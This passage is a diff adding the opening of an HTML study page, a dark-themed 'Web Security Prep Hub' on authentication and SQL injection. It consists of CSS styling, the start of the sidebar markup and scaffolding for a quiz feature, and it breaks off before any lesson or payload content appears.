@@ -1,0 +1,2804 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web Security Prep Hub — Authentication & SQL Injection Mastery</title>
+<style>
+/* ============================================================
+   DESIGN TOKENS & VARIABLES
+   ============================================================ */
+:root {
+  --bg-primary: #0a0b0f;
+  --bg-secondary: #0f1117;
+  --bg-card: rgba(255,255,255,0.03);
+  --bg-glass: rgba(255,255,255,0.05);
+  --bg-hover: rgba(255,255,255,0.07);
+  --border: rgba(255,255,255,0.08);
+  --border-accent: rgba(0,255,136,0.3);
+  --text-primary: #e8eaf0;
+  --text-secondary: #8b8fa8;
+  --text-muted: #5a5d72;
+  --accent-green: #00ff88;
+  --accent-cyan: #00d4ff;
+  --accent-purple: #7c3aed;
+  --accent-red: #ff4757;
+  --accent-orange: #ff6b35;
+  --accent-yellow: #ffd93d;
+  --glow-green: 0 0 20px rgba(0,255,136,0.2);
+  --glow-cyan: 0 0 20px rgba(0,212,255,0.2);
+  --sidebar-w: 280px;
+  --font-display: 'Courier New', 'Lucida Console', monospace;
+  --font-body: -apple-system, 'SF Pro Text', 'Segoe UI', sans-serif;
+  --font-code: 'Courier New', Consolas, monospace;
+  --radius-sm: 6px;
+  --radius-md: 12px;
+  --radius-lg: 18px;
+  --transition: 0.2s cubic-bezier(0.4,0,0.2,1);
+}
+
+[data-theme="light"] {
+  --bg-primary: #f0f2f8;
+  --bg-secondary: #e8eaf4;
+  --bg-card: rgba(255,255,255,0.8);
+  --bg-glass: rgba(255,255,255,0.9);
+  --bg-hover: rgba(0,0,0,0.04);
+  --border: rgba(0,0,0,0.08);
+  --border-accent: rgba(0,150,80,0.3);
+  --text-primary: #1a1d2e;
+  --text-secondary: #4a4d62;
+  --text-muted: #8a8da2;
+  --accent-green: #00a855;
+  --accent-cyan: #0095cc;
+  --glow-green: 0 0 20px rgba(0,168,85,0.15);
+  --glow-cyan: 0 0 20px rgba(0,149,204,0.15);
+}
+
+/* ============================================================
+   RESET & BASE
+   ============================================================ */
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+html { scroll-behavior: smooth; font-size: 16px; }
+
+body {
+  font-family: var(--font-body);
+  background: var(--bg-primary);
+  color: var(--text-primary);
+  line-height: 1.7;
+  overflow-x: hidden;
+  transition: background var(--transition), color var(--transition);
+}
+
+/* Scanline overlay */
+body::before {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,136,0.008) 2px, rgba(0,255,136,0.008) 4px);
+  pointer-events: none;
+  z-index: 0;
+}
+
+/* ============================================================
+   LAYOUT
+   ============================================================ */
+.app-wrapper {
+  display: flex;
+  min-height: 100vh;
+  position: relative;
+}
+
+/* ============================================================
+   SIDEBAR
+   ============================================================ */
+.sidebar {
+  width: var(--sidebar-w);
+  background: var(--bg-secondary);
+  border-right: 1px solid var(--border);
+  position: fixed;
+  top: 0; left: 0;
+  height: 100vh;
+  overflow-y: auto;
+  z-index: 100;
+  display: flex;
+  flex-direction: column;
+  transition: transform var(--transition);
+}
+
+.sidebar::-webkit-scrollbar { width: 4px; }
+.sidebar::-webkit-scrollbar-track { background: transparent; }
+.sidebar::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+
+.sidebar-logo {
+  padding: 24px 20px 16px;
+  border-bottom: 1px solid var(--border);
+  flex-shrink: 0;
+}
+
+.logo-badge {
+  font-family: var(--font-display);
+  font-size: 10px;
+  font-weight: bold;
+  letter-spacing: 3px;
+  color: var(--accent-green);
+  text-transform: uppercase;
+  margin-bottom: 6px;
+  display: block;
+}
+
+.logo-title {
+  font-size: 15px;
+  font-weight: 700;
+  color: var(--text-primary);
+  line-height: 1.3;
+}
+
+.logo-sub {
+  font-size: 11px;
+  color: var(--text-muted);
+  margin-top: 3px;
+}
+
+/* Progress mini dashboard */
+.sidebar-stats {
+  padding: 14px 20px;
+  border-bottom: 1px solid var(--border);
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 8px;
+}
+
+.stat-mini {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-sm);
+  padding: 8px 10px;
+  text-align: center;
+}
+
+.stat-mini-val {
+  font-family: var(--font-display);
+  font-size: 18px;
+  font-weight: bold;
+  color: var(--accent-green);
+  line-height: 1;
+}
+
+.stat-mini-lbl {
+  font-size: 9px;
+  color: var(--text-muted);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  margin-top: 3px;
+}
+
+.progress-bar-wrap {
+  padding: 8px 20px 12px;
+  border-bottom: 1px solid var(--border);
+}
+
+.progress-label {
+  display: flex;
+  justify-content: space-between;
+  font-size: 10px;
+  color: var(--text-muted);
+  margin-bottom: 5px;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+}
+
+.progress-bar {
+  height: 4px;
+  background: var(--border);
+  border-radius: 2px;
+  overflow: hidden;
+}
+
+.progress-fill {
+  height: 100%;
+  background: linear-gradient(90deg, var(--accent-green), var(--accent-cyan));
+  border-radius: 2px;
+  transition: width 0.5s ease;
+  width: 0%;
+}
+
+/* Sidebar nav */
+.sidebar-nav { flex: 1; padding: 12px 0; }
+
+.nav-section-header {
+  padding: 8px 20px 4px;
+  font-size: 9px;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 2px;
+  color: var(--text-muted);
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.nav-section-header::after {
+  content: '';
+  flex: 1;
+  height: 1px;
+  background: var(--border);
+}
+
+.nav-item {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 7px 20px;
+  cursor: pointer;
+  transition: all var(--transition);
+  font-size: 12.5px;
+  color: var(--text-secondary);
+  border-left: 2px solid transparent;
+  position: relative;
+}
+
+.nav-item:hover {
+  background: var(--bg-hover);
+  color: var(--text-primary);
+  border-left-color: var(--border-accent);
+}
+
+.nav-item.active {
+  color: var(--accent-green);
+  background: rgba(0,255,136,0.06);
+  border-left-color: var(--accent-green);
+}
+
+.nav-item.studied .nav-check {
+  color: var(--accent-green);
+  opacity: 1;
+}
+
+.nav-check {
+  margin-left: auto;
+  font-size: 10px;
+  opacity: 0;
+  transition: opacity var(--transition);
+}
+
+.nav-icon { font-size: 12px; flex-shrink: 0; width: 16px; text-align: center; }
+
+/* Sidebar actions */
+.sidebar-actions {
+  padding: 12px 20px;
+  border-top: 1px solid var(--border);
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+}
+
+.btn-sidebar {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  padding: 8px 12px;
+  border-radius: var(--radius-sm);
+  border: 1px solid var(--border);
+  background: var(--bg-card);
+  color: var(--text-secondary);
+  font-size: 12px;
+  cursor: pointer;
+  transition: all var(--transition);
+  font-family: var(--font-body);
+  width: 100%;
+}
+
+.btn-sidebar:hover {
+  border-color: var(--accent-green);
+  color: var(--accent-green);
+  background: rgba(0,255,136,0.05);
+}
+
+/* ============================================================
+   MAIN CONTENT
+   ============================================================ */
+.main-content {
+  margin-left: var(--sidebar-w);
+  flex: 1;
+  min-width: 0;
+  padding: 0;
+  position: relative;
+  z-index: 1;
+}
+
+/* ============================================================
+   TOP BAR
+   ============================================================ */
+.topbar {
+  position: sticky;
+  top: 0;
+  z-index: 50;
+  background: rgba(10,11,15,0.85);
+  backdrop-filter: blur(20px);
+  -webkit-backdrop-filter: blur(20px);
+  border-bottom: 1px solid var(--border);
+  padding: 12px 40px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+
+[data-theme="light"] .topbar { background: rgba(240,242,248,0.85); }
+
+.topbar-title {
+  font-family: var(--font-display);
+  font-size: 13px;
+  color: var(--text-secondary);
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.topbar-title .breadcrumb-sep { color: var(--text-muted); }
+
+.topbar-actions { display: flex; align-items: center; gap: 10px; }
+
+.btn-icon {
+  width: 34px; height: 34px;
+  border-radius: var(--radius-sm);
+  border: 1px solid var(--border);
+  background: var(--bg-card);
+  color: var(--text-secondary);
+  cursor: pointer;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 14px;
+  transition: all var(--transition);
+  font-family: var(--font-body);
+}
+
+.btn-icon:hover { border-color: var(--accent-cyan); color: var(--accent-cyan); }
+
+.btn-quiz {
+  padding: 6px 14px;
+  border-radius: var(--radius-sm);
+  background: linear-gradient(135deg, var(--accent-green), var(--accent-cyan));
+  color: #000;
+  font-size: 12px;
+  font-weight: 700;
+  border: none;
+  cursor: pointer;
+  font-family: var(--font-body);
+  letter-spacing: 0.5px;
+  transition: all var(--transition);
+}
+
+.btn-quiz:hover { opacity: 0.85; transform: translateY(-1px); }
+
+/* Mobile sidebar toggle */
+.btn-menu {
+  display: none;
+  width: 34px; height: 34px;
+  border-radius: var(--radius-sm);
+  border: 1px solid var(--border);
+  background: var(--bg-card);
+  color: var(--text-secondary);
+  cursor: pointer;
+  align-items: center; justify-content: center;
+  font-size: 16px;
+  font-family: var(--font-body);
+}
+
+/* ============================================================
+   CONTENT AREA
+   ============================================================ */
+.content-area { padding: 40px 40px 80px; max-width: 1000px; }
+
+/* ============================================================
+   DASHBOARD PANEL
+   ============================================================ */
+.dashboard {
+  display: grid;
+  grid-template-columns: repeat(4, 1fr);
+  gap: 16px;
+  margin-bottom: 40px;
+}
+
+.dash-card {
+  background: var(--bg-glass);
+  backdrop-filter: blur(10px);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-md);
+  padding: 20px;
+  position: relative;
+  overflow: hidden;
+  transition: border-color var(--transition);
+}
+
+.dash-card::before {
+  content: '';
+  position: absolute;
+  top: 0; left: 0; right: 0;
+  height: 2px;
+  background: linear-gradient(90deg, transparent, var(--accent-green), transparent);
+  opacity: 0.5;
+}
+
+.dash-card:hover { border-color: var(--border-accent); }
+
+.dash-icon { font-size: 22px; margin-bottom: 10px; }
+.dash-val {
+  font-family: var(--font-display);
+  font-size: 30px;
+  font-weight: bold;
+  color: var(--accent-green);
+  line-height: 1;
+}
+.dash-lbl { font-size: 11px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; margin-top: 4px; }
+
+.dash-card.cyan .dash-val { color: var(--accent-cyan); }
+.dash-card.cyan::before { background: linear-gradient(90deg, transparent, var(--accent-cyan), transparent); }
+.dash-card.purple .dash-val { color: #a78bfa; }
+.dash-card.purple::before { background: linear-gradient(90deg, transparent, #a78bfa, transparent); }
+.dash-card.orange .dash-val { color: var(--accent-orange); }
+.dash-card.orange::before { background: linear-gradient(90deg, transparent, var(--accent-orange), transparent); }
+
+/* ============================================================
+   SECTION HEADERS
+   ============================================================ */
+.section-hero {
+  margin-bottom: 32px;
+  padding: 28px 32px;
+  background: var(--bg-glass);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  position: relative;
+  overflow: hidden;
+}
+
+.section-hero::before {
+  content: '';
+  position: absolute;
+  top: -60px; right: -60px;
+  width: 200px; height: 200px;
+  background: radial-gradient(circle, rgba(0,255,136,0.08) 0%, transparent 70%);
+  pointer-events: none;
+}
+
+.section-hero.sqli::before {
+  background: radial-gradient(circle, rgba(0,212,255,0.08) 0%, transparent 70%);
+}
+
+.section-tag {
+  font-family: var(--font-display);
+  font-size: 10px;
+  font-weight: bold;
+  letter-spacing: 3px;
+  text-transform: uppercase;
+  padding: 3px 10px;
+  border-radius: 3px;
+  margin-bottom: 12px;
+  display: inline-block;
+}
+
+.section-tag.auth { background: rgba(0,255,136,0.1); color: var(--accent-green); border: 1px solid rgba(0,255,136,0.2); }
+.section-tag.sqli { background: rgba(0,212,255,0.1); color: var(--accent-cyan); border: 1px solid rgba(0,212,255,0.2); }
+
+.section-hero h1 {
+  font-size: 26px;
+  font-weight: 800;
+  letter-spacing: -0.5px;
+  color: var(--text-primary);
+  margin-bottom: 8px;
+}
+
+.section-hero p {
+  font-size: 14px;
+  color: var(--text-secondary);
+  max-width: 600px;
+}
+
+/* ============================================================
+   TOPIC CARDS
+   ============================================================ */
+.topic-card {
+  background: var(--bg-glass);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-md);
+  margin-bottom: 12px;
+  overflow: hidden;
+  transition: border-color var(--transition);
+}
+
+.topic-card:hover { border-color: rgba(255,255,255,0.15); }
+.topic-card.studied { border-color: rgba(0,255,136,0.25); }
+
+.topic-header {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 16px 20px;
+  cursor: pointer;
+  transition: background var(--transition);
+  user-select: none;
+}
+
+.topic-header:hover { background: var(--bg-hover); }
+
+.topic-num {
+  font-family: var(--font-display);
+  font-size: 11px;
+  color: var(--text-muted);
+  min-width: 28px;
+}
+
+.topic-title {
+  flex: 1;
+  font-size: 14px;
+  font-weight: 600;
+  color: var(--text-primary);
+}
+
+.topic-badge {
+  font-size: 9px;
+  font-weight: 700;
+  letter-spacing: 1px;
+  text-transform: uppercase;
+  padding: 2px 8px;
+  border-radius: 3px;
+  flex-shrink: 0;
+}
+
+.topic-badge.high { background: rgba(255,71,87,0.15); color: var(--accent-red); }
+.topic-badge.med { background: rgba(255,107,53,0.15); color: var(--accent-orange); }
+.topic-badge.low { background: rgba(255,217,61,0.15); color: var(--accent-yellow); }
+
+.topic-chevron {
+  font-size: 12px;
+  color: var(--text-muted);
+  transition: transform var(--transition);
+  flex-shrink: 0;
+}
+
+.topic-card.open .topic-chevron { transform: rotate(180deg); }
+
+.topic-studied-btn {
+  width: 22px; height: 22px;
+  border-radius: 50%;
+  border: 1.5px solid var(--border);
+  background: transparent;
+  cursor: pointer;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 10px;
+  color: transparent;
+  transition: all var(--transition);
+  flex-shrink: 0;
+  font-family: var(--font-body);
+}
+
+.topic-card.studied .topic-studied-btn {
+  background: var(--accent-green);
+  border-color: var(--accent-green);
+  color: #000;
+}
+
+.topic-body {
+  max-height: 0;
+  overflow: hidden;
+  transition: max-height 0.4s cubic-bezier(0.4,0,0.2,1);
+  border-top: 0px solid var(--border);
+}
+
+.topic-card.open .topic-body {
+  max-height: 3000px;
+  border-top: 1px solid var(--border);
+}
+
+.topic-content { padding: 24px; }
+
+/* ============================================================
+   CONTENT TYPOGRAPHY
+   ============================================================ */
+.topic-content h3 {
+  font-size: 13px;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  color: var(--accent-green);
+  margin: 24px 0 12px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.topic-content h3:first-child { margin-top: 0; }
+
+.topic-content h3::before {
+  content: '';
+  display: block;
+  width: 3px;
+  height: 14px;
+  background: var(--accent-green);
+  border-radius: 2px;
+}
+
+.topic-content p {
+  font-size: 13.5px;
+  color: var(--text-secondary);
+  margin-bottom: 10px;
+  line-height: 1.75;
+}
+
+.topic-content ul, .topic-content ol {
+  margin: 8px 0 12px 16px;
+  font-size: 13.5px;
+  color: var(--text-secondary);
+}
+
+.topic-content li { margin-bottom: 6px; line-height: 1.6; }
+
+/* Code blocks */
+.code-block {
+  background: rgba(0,0,0,0.5);
+  border: 1px solid var(--border);
+  border-left: 3px solid var(--accent-green);
+  border-radius: var(--radius-sm);
+  padding: 14px 16px;
+  margin: 12px 0;
+  font-family: var(--font-code);
+  font-size: 12px;
+  color: #a8ff78;
+  overflow-x: auto;
+  line-height: 1.7;
+  white-space: pre;
+}
+
+.code-block.cyan { border-left-color: var(--accent-cyan); color: #80ffff; }
+.code-block.red { border-left-color: var(--accent-red); color: #ff8080; }
+
+[data-theme="light"] .code-block { background: rgba(0,0,0,0.06); color: #005522; }
+[data-theme="light"] .code-block.cyan { color: #004488; }
+[data-theme="light"] .code-block.red { color: #880000; }
+
+/* Info boxes */
+.info-box {
+  border-radius: var(--radius-sm);
+  padding: 14px 16px;
+  margin: 12px 0;
+  font-size: 13px;
+  line-height: 1.65;
+  border: 1px solid;
+  display: flex;
+  gap: 12px;
+  align-items: flex-start;
+}
+
+.info-box .box-icon { font-size: 16px; flex-shrink: 0; margin-top: 1px; }
+.info-box .box-body { flex: 1; }
+.info-box .box-title { font-weight: 700; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px; }
+
+.info-box.tip { background: rgba(0,255,136,0.05); border-color: rgba(0,255,136,0.2); color: var(--text-secondary); }
+.info-box.tip .box-title { color: var(--accent-green); }
+.info-box.warning { background: rgba(255,107,53,0.05); border-color: rgba(255,107,53,0.2); color: var(--text-secondary); }
+.info-box.warning .box-title { color: var(--accent-orange); }
+.info-box.danger { background: rgba(255,71,87,0.05); border-color: rgba(255,71,87,0.2); color: var(--text-secondary); }
+.info-box.danger .box-title { color: var(--accent-red); }
+.info-box.info { background: rgba(0,212,255,0.05); border-color: rgba(0,212,255,0.2); color: var(--text-secondary); }
+.info-box.info .box-title { color: var(--accent-cyan); }
+.info-box.exam { background: rgba(124,58,237,0.05); border-color: rgba(124,58,237,0.2); color: var(--text-secondary); }
+.info-box.exam .box-title { color: #a78bfa; }
+
+/* Tables */
+.comp-table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 12.5px;
+  margin: 14px 0;
+  overflow: hidden;
+  border-radius: var(--radius-sm);
+  border: 1px solid var(--border);
+}
+
+.comp-table th {
+  background: rgba(0,255,136,0.08);
+  color: var(--accent-green);
+  font-weight: 700;
+  font-size: 11px;
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  padding: 10px 14px;
+  text-align: left;
+  border-bottom: 1px solid var(--border);
+}
+
+.comp-table td {
+  padding: 9px 14px;
+  border-bottom: 1px solid rgba(255,255,255,0.04);
+  color: var(--text-secondary);
+  vertical-align: top;
+}
+
+.comp-table tr:last-child td { border-bottom: none; }
+.comp-table tr:hover td { background: var(--bg-hover); }
+.comp-table .td-green { color: var(--accent-green); }
+.comp-table .td-red { color: var(--accent-red); }
+.comp-table .td-cyan { color: var(--accent-cyan); }
+
+/* Payload grid */
+.payload-grid {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 8px;
+  margin: 12px 0;
+}
+
+.payload-item {
+  background: rgba(0,0,0,0.4);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-sm);
+  padding: 10px 12px;
+  font-family: var(--font-code);
+  font-size: 11.5px;
+  color: #a8ff78;
+  transition: border-color var(--transition);
+}
+
+.payload-item:hover { border-color: var(--accent-green); }
+[data-theme="light"] .payload-item { background: rgba(0,0,0,0.04); color: #005522; }
+
+/* Tags row */
+.tag-row { display: flex; flex-wrap: wrap; gap: 6px; margin: 8px 0; }
+
+.tag {
+  font-size: 11px;
+  padding: 3px 10px;
+  border-radius: 20px;
+  border: 1px solid;
+  font-family: var(--font-display);
+}
+
+.tag.green { background: rgba(0,255,136,0.08); border-color: rgba(0,255,136,0.25); color: var(--accent-green); }
+.tag.cyan { background: rgba(0,212,255,0.08); border-color: rgba(0,212,255,0.25); color: var(--accent-cyan); }
+.tag.red { background: rgba(255,71,87,0.08); border-color: rgba(255,71,87,0.25); color: var(--accent-red); }
+.tag.purple { background: rgba(124,58,237,0.08); border-color: rgba(124,58,237,0.25); color: #a78bfa; }
+.tag.orange { background: rgba(255,107,53,0.08); border-color: rgba(255,107,53,0.25); color: var(--accent-orange); }
+
+/* Step list */
+.step-list { counter-reset: steps; margin: 12px 0; }
+.step-item {
+  display: flex;
+  gap: 14px;
+  margin-bottom: 12px;
+  align-items: flex-start;
+}
+
+.step-num {
+  counter-increment: steps;
+  width: 24px; height: 24px;
+  border-radius: 50%;
+  background: rgba(0,255,136,0.1);
+  border: 1px solid rgba(0,255,136,0.3);
+  color: var(--accent-green);
+  font-size: 11px;
+  font-weight: bold;
+  display: flex; align-items: center; justify-content: center;
+  flex-shrink: 0;
+  font-family: var(--font-display);
+}
+
+.step-body { font-size: 13.5px; color: var(--text-secondary); line-height: 1.65; padding-top: 2px; }
+
+/* ============================================================
+   QUICK REFERENCE BLOCKS
+   ============================================================ */
+.quick-ref {
+  background: var(--bg-glass);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-md);
+  padding: 20px 24px;
+  margin-bottom: 12px;
+}
+
+.quick-ref-title {
+  font-family: var(--font-display);
+  font-size: 12px;
+  font-weight: bold;
+  letter-spacing: 2px;
+  text-transform: uppercase;
+  color: var(--accent-cyan);
+  margin-bottom: 14px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.quick-ref-title::after {
+  content: '';
+  flex: 1;
+  height: 1px;
+  background: var(--border);
+}
+
+/* ============================================================
+   QUIZ MODAL
+   ============================================================ */
+.quiz-overlay {
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.85);
+  backdrop-filter: blur(8px);
+  z-index: 500;
+  display: none;
+  align-items: center;
+  justify-content: center;
+  padding: 20px;
+}
+
+.quiz-overlay.active { display: flex; }
+
+.quiz-modal {
+  background: var(--bg-secondary);
+  border: 1px solid var(--border);
+  border-radius: var(--radius-lg);
+  width: 100%;
+  max-width: 640px;
+  max-height: 90vh;
+  overflow-y: auto;
+  position: relative;
+}
+
+.quiz-header {
+  padding: 24px 28px 16px;
+  border-bottom: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+
+.quiz-header h2 {
+  font-size: 17px;
+  font-weight: 700;
+}
+
+.quiz-close {
+  width: 30px; height: 30px;
+  border-radius: var(--radius-sm);
+  border: 1px solid var(--border);
+  background: var(--bg-card);
+  color: var(--text-secondary);
+  cursor: pointer;
+  font-size: 16px;
+  display: flex; align-items: center; justify-content: center;
+  font-family: var(--font-body);
+  transition: all var(--transition);
+}
+
+.quiz-close:hover { border-color: var(--accent-red); color: var(--accent-red); }
+
+.quiz-body { padding: 24px 28px; }
+
+.quiz-meta {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 20px;
+}
+
+.quiz-counter {
+  font-family: var(--font-display);
+  font-size: 12px;
+  color: var(--text-muted);
+}
+
+.quiz-score-display {
+  font-family: var(--font-display);
+  font-size: 13px;
+  color: var(--accent-green);
+}
+
+.quiz-q-num {
+  font-size: 11px;
+  color: var(--text-muted);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+  margin-bottom: 8px;
+}
+
+.quiz-question {
+  font-size: 15px;
+  font-weight: 600;
+  color: var(--text-primary);
+  margin-bottom: 20px;
+  line-height: 1.6;
+}
+
+.quiz-options { display: flex; flex-direction: column; gap: 8px; }
+
+.quiz-option {
+  padding: 12px 16px;
+  border-radius: var(--radius-sm);
+  border: 1px solid var(--border);
+  background: var(--bg-card);
+  cursor: pointer;
+  font-size: 13.5px;
+  color: var(--text-secondary);
+  transition: all var(--transition);
+  text-align: left;
+  font-family: var(--font-body);
+  width: 100%;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.quiz-option:hover:not(:disabled) {
+  border-color: var(--accent-cyan);
+  color: var(--text-primary);
+  background: rgba(0,212,255,0.05);
+}
+
+.quiz-option.correct {
+  border-color: var(--accent-green);
+  background: rgba(0,255,136,0.08);
+  color: var(--accent-green);
+}
+
+.quiz-option.wrong {
+  border-color: var(--accent-red);
+  background: rgba(255,71,87,0.08);
+  color: var(--accent-red);
+}
+
+.quiz-option:disabled { cursor: default; }
+
+.opt-letter {
+  width: 22px; height: 22px;
+  border-radius: 50%;
+  border: 1px solid var(--border);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 11px;
+  font-weight: bold;
+  flex-shrink: 0;
+  font-family: var(--font-display);
+}
+
+.quiz-feedback {
+  margin-top: 16px;
+  padding: 12px 16px;
+  border-radius: var(--radius-sm);
+  font-size: 13px;
+  display: none;
+}
+
+.quiz-feedback.show { display: block; }
+.quiz-feedback.correct-fb { background: rgba(0,255,136,0.08); border: 1px solid rgba(0,255,136,0.2); color: var(--accent-green); }
+.quiz-feedback.wrong-fb { background: rgba(255,71,87,0.08); border: 1px solid rgba(255,71,87,0.2); color: var(--accent-red); }
+
+.quiz-footer {
+  padding: 16px 28px 24px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  border-top: 1px solid var(--border);
+}
+
+.btn-next {
+  padding: 9px 22px;
+  background: linear-gradient(135deg, var(--accent-green), var(--accent-cyan));
+  color: #000;
+  border: none;
+  border-radius: var(--radius-sm);
+  font-weight: 700;
+  font-size: 13px;
+  cursor: pointer;
+  font-family: var(--font-body);
+  transition: opacity var(--transition);
+}
+
+.btn-next:hover { opacity: 0.85; }
+
+.quiz-progress-bar {
+  flex: 1;
+  height: 4px;
+  background: var(--border);
+  border-radius: 2px;
+  margin-right: 16px;
+  overflow: hidden;
+}
+
+.quiz-progress-fill {
+  height: 100%;
+  background: linear-gradient(90deg, var(--accent-green), var(--accent-cyan));
+  border-radius: 2px;
+  transition: width 0.3s ease;
+}
+
+/* Quiz results */
+.quiz-results {
+  padding: 40px 28px;
+  text-align: center;
+}
+
+.quiz-result-score {
+  font-family: var(--font-display);
+  font-size: 60px;
+  font-weight: bold;
+  line-height: 1;
+  margin-bottom: 10px;
+}
+
+.quiz-result-score.pass { color: var(--accent-green); }
+.quiz-result-score.fail { color: var(--accent-red); }
+.quiz-result-grade { font-size: 14px; color: var(--text-secondary); margin-bottom: 20px; }
+
+/* ============================================================
+   BACK TO TOP
+   ============================================================ */
+.back-to-top {
+  position: fixed;
+  bottom: 30px;
+  right: 30px;
+  width: 40px; height: 40px;
+  border-radius: 50%;
+  background: var(--bg-secondary);
+  border: 1px solid var(--border);
+  color: var(--text-secondary);
+  cursor: pointer;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 16px;
+  z-index: 200;
+  opacity: 0;
+  transform: translateY(10px);
+  transition: all var(--transition);
+  font-family: var(--font-body);
+}
+
+.back-to-top.show {
+  opacity: 1;
+  transform: translateY(0);
+}
+
+.back-to-top:hover { border-color: var(--accent-green); color: var(--accent-green); }
+
+/* ============================================================
+   SIDEBAR OVERLAY (MOBILE)
+   ============================================================ */
+.sidebar-overlay {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: rgba(0,0,0,0.6);
+  z-index: 90;
+}
+
+/* ============================================================
+   SECTION DIVIDER
+   ============================================================ */
+.section-divider {
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  margin: 40px 0 32px;
+}
+
+.section-divider-line { flex: 1; height: 1px; background: var(--border); }
+.section-divider-text {
+  font-family: var(--font-display);
+  font-size: 11px;
+  color: var(--text-muted);
+  text-transform: uppercase;
+  letter-spacing: 2px;
+}
+
+/* ============================================================
+   RESPONSIVE
+   ============================================================ */
+@media (max-width: 900px) {
+  .sidebar { transform: translateX(-100%); }
+  .sidebar.mobile-open { transform: translateX(0); }
+  .sidebar-overlay { display: block; }
+  .main-content { margin-left: 0; }
+  .topbar { padding: 10px 20px; }
+  .content-area { padding: 24px 20px 60px; }
+  .dashboard { grid-template-columns: 1fr 1fr; }
+  .btn-menu { display: flex; }
+}
+
+@media (max-width: 560px) {
+  .dashboard { grid-template-columns: 1fr 1fr; gap: 10px; }
+  .payload-grid { grid-template-columns: 1fr; }
+  .comp-table { font-size: 11px; }
+  .comp-table th, .comp-table td { padding: 7px 10px; }
+}
+
+/* ============================================================
+   ANIMATIONS
+   ============================================================ */
+@keyframes fadeInUp {
+  from { opacity: 0; transform: translateY(16px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+@keyframes pulse-glow {
+  0%, 100% { box-shadow: none; }
+  50% { box-shadow: var(--glow-green); }
+}
+
+.content-area > * {
+  animation: fadeInUp 0.4s ease both;
+}
+
+.content-area > *:nth-child(2) { animation-delay: 0.05s; }
+.content-area > *:nth-child(3) { animation-delay: 0.1s; }
+.content-area > *:nth-child(4) { animation-delay: 0.15s; }
+
+/* Terminal cursor */
+.cursor::after {
+  content: '|';
+  animation: blink 1s step-end infinite;
+  color: var(--accent-green);
+}
+
+@keyframes blink {
+  0%, 100% { opacity: 1; }
+  50% { opacity: 0; }
+}
+
+/* Highlight */
+em {
+  font-style: normal;
+  color: var(--accent-green);
+  font-weight: 600;
+}
+
+.highlight-cyan { color: var(--accent-cyan); font-weight: 600; }
+.highlight-red { color: var(--accent-red); font-weight: 600; }
+.highlight-orange { color: var(--accent-orange); font-weight: 600; }
+
+/* Neon border for special cards */
+.neon-border { box-shadow: 0 0 0 1px rgba(0,255,136,0.15), inset 0 0 30px rgba(0,255,136,0.02); }
+
+strong { color: var(--text-primary); font-weight: 600; }
+</style>
+</head>
+<body>
+
+<!-- SIDEBAR OVERLAY (mobile) -->
+<div class="sidebar-overlay" id="sidebarOverlay" onclick="closeSidebar()"></div>
+
+<!-- SIDEBAR -->
+<nav class="sidebar" id="sidebar">
+  <div class="sidebar-logo">
+    <span class="logo-badge cursor">// WEB-SEC</span>
+    <div class="logo-title">Web Security Prep Hub</div>
+    <div class="logo-sub">Authentication & SQL Injection</div>
+  </div>
+
+  <div class="sidebar-stats">
+    <div class="stat-mini">
+      <div class="stat-mini-val" id="sb-studied">0</div>
+      <div class="stat-mini-lbl">Studied</div>
+    </div>
+    <div class="stat-mini">
+      <div class="stat-mini-val" id="sb-total">0</div>
+      <div class="stat-mini-lbl">Total</div>
+    </div>
+    <div class="stat-mini">
+      <div class="stat-mini-val" id="sb-quiz-score">—</div>
+      <div class="stat-mini-lbl">Quiz</div>
+    </div>
+    <div class="stat-mini">
+      <div class="stat-mini-val" id="sb-pct">0%</div>
+      <div class="stat-mini-lbl">Done</div>
+    </div>
+  </div>
+
+  <div class="progress-bar-wrap">
+    <div class="progress-label"><span>Study Progress</span><span id="sb-pct2">0%</span></div>
+    <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+  </div>
+
+  <div class="sidebar-nav" id="sidebarNav">
